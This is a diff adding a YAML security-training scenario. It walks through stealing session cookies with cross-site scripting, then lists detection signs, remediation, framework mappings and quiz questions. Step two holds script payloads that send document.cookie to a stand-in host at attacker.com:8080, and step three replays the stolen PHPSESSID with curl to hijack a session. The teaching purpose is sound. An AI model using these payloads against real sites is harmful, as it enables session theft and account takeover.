@@ -1,0 +1,99 @@
+# Category: Cross-Site Scripting (XSS)
+name: "Exploiting cross-site scripting to steal cookies"
+id: "xss-steal-cookies-001"
+category: "xss"
+subcategory: "post_exploitation"
+difficulty: "practitioner"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers using an XSS vulnerability to steal a victim's session
+  cookies and send them to an attacker-controlled server. The stolen cookies
+  can then be used to hijack the victim's session and impersonate them.
+
+learning_objectives:
+  - Understand how to exfiltrate cookies via XSS
+  - Use `document.cookie` to access cookies
+  - Send cookies to an external server using `fetch` or `Image` objects
+  - Use stolen cookies to impersonate the victim
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+  - Python HTTP server (for receiving cookies)
+  - curl
+
+prerequisites:
+  - XSS vulnerability identified
+  - A server to receive stolen cookies
+  - Understanding of HTTP cookies and sessions
+
+steps:
+  - id: "step1"
+    phase: "setup"
+    action: "Set up a listener to receive stolen cookies"
+    commands:
+      - "# Start a Python HTTP server:"
+      - "python3 -m http.server 8080"
+      - "# Or use a simple PHP script to log cookies"
+    expected_output: "Server listening on port 8080"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject a payload to steal cookies"
+    commands:
+      - "# Payload: <script>fetch('http://attacker.com:8080/steal?cookie='+encodeURIComponent(document.cookie))</script>"
+      - "# Alternative using Image: <script>new Image().src='http://attacker.com:8080/steal?cookie='+document.cookie</script>"
+      - "# For HttpOnly cookies, consider XSS with XHR:"
+    expected_output: "Cookie sent to attacker's server"
+    detection: "Web server logs may show the payload"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Use stolen cookies to hijack session"
+    commands:
+      - "# Use curl to replay the session:"
+      - "curl -X GET http://target.com/profile -H 'Cookie: PHPSESSID=abc123...'"
+      - "# Or modify browser cookies and refresh the page"
+    expected_output: "Access to victim's session"
+    detection: "Application logs may show unusual access"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "Requests to external domains containing cookies"
+  log_indicators:
+    - "Web server logs with suspicious outbound requests"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use HttpOnly flag on session cookies"
+    - "Implement XSS prevention measures"
+  long_term:
+    - "Use short-lived session tokens"
+    - "Implement IP/User-Agent binding for sessions"
+
+variables:
+  attacker_server: "http://attacker.com:8080"
+  cookie_name: "PHPSESSID"
+
+assessment_questions:
+  - "Why does `document.cookie` not work on HttpOnly cookies?"
+  - "How can you still steal HttpOnly cookies?"
+  - "What is the best defense against cookie theft?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/xss/"
+    title: "OWASP XSS"
+  - url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies"
+    title: "MDN Cookies"
